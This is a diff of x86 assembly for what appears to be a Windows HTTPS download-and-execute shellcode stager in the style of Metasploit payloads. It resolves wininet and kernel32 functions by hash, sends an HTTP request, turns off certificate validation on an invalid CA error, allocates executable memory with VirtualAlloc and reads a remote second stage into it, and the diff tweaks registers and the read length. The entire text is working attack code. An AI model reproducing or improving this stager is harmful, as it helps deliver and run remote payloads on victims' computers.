@@ -8,7 +8,6 @@
 ; Input: EBP must be the address of 'api_call'.
 ; Output: EDI will be the socket for the connection to the server
 ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
-
 load_wininet:
   push 0x0074656e        ; Push the bytes 'wininet',0 onto the stack.
   push 0x696e6977        ; ...
@@ -69,11 +68,11 @@ httpopenrequest:
   mov esi, eax           ; hHttpRequest
 
 httpsendrequest:
-  xor ebx, ebx
-  push ebx               ; optional length
-  push ebx               ; optional
-  push ebx               ; dwHeadersLength
-  push ebx               ; headers
+  xor edi, edi
+  push edi               ; optional length
+  push edi               ; optional
+  push edi               ; dwHeadersLength
+  push edi               ; headers
   push esi               ; hHttpRequest
   push 0x7B18062D        ; hash( "wininet.dll", "HttpSendRequestA" )
   call ebp
@@ -84,9 +83,11 @@ check_ssl:
 ; In the case of an invalid certificate authority, we have to wait until the error occurs,
 ; set an option to disable it, then try it all over again. This wastes shellcode space,
 ; but its required to use this payload without a valid signed cert.
-  push 0x5DE2C5AA        ; hash( "kernel32.dll", "GetLastError" )
-  call ebp
-  cmp al, 0x0d           ; ERROR_INTERNET_INVALID_CA (0x2f0d)
+;  push 0x5DE2C5AA        ; hash( "kernel32.dll", "GetLastError" )
+;  call ebp
+
+  ; The error message is left in ECX
+  cmp cl, 0x0d           ; ERROR_INTERNET_INVALID_CA (0x2f0d)
   jne failure
 
 ; InternetSetOption (hReq, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof (dwFlags) );
@@ -121,7 +122,7 @@ allocate_memory:
   push byte 0x40         ; PAGE_EXECUTE_READWRITE
   push 0x1000            ; MEM_COMMIT
   push 0x00400000        ; Stage allocation (8Mb ought to do us)
-  push ebx               ; NULL as we dont care where the allocation is (zero'd from the prev function)
+  push edi               ; NULL as we dont care where the allocation is (zero'd from the prev function)
   push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
   call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
 
@@ -133,7 +134,7 @@ download_prep:
 
 download_more:
   push edi               ; &bytesRead
-  push ebx               ; buffer as the length, seems to work (Win7)
+  push 8192              ; read length
   push ebx               ; buffer
   push esi               ; hRequest
   push 0xE2899612        ; hash( "wininet.dll", "InternetReadFile" )
